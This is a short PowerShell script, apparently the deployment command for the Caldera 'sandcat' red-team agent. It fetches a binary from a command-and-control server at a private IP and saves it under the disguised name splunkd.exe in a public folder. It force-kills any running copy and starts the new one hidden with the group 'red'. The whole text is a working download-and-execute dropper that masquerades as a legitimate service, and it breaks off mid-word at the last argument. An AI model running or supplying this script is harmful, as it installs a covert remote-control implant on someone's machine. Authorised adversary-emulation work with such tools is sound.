# Set server URL
$server = "http://192.168.1.129:8888"
$url = "$server/file/download"

# Initialize WebClient and set headers
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("platform", "windows")
$wc.Headers.Add("file", "sandcat.go")

# Download data
$data = $wc.DownloadData($url)

# Stop process if it is running
get-process | Where-Object { $_.modules.filename -like "C:\Users\Public\splunkd.exe" } | Stop-Process -Force

# Remove file if it exists
Remove-Item -Path "C:\Users\Public\splunkd.exe" -Force -ErrorAction SilentlyContinue

# Write the downloaded data to a file
[System.IO.File]::WriteAllBytes("C:\Users\Public\splunkd.exe", $data)

# Start a new process
Start-Process -FilePath "C:\Users\Public\splunkd.exe" -ArgumentList "-server $server -group red" -WindowStyle Hidde

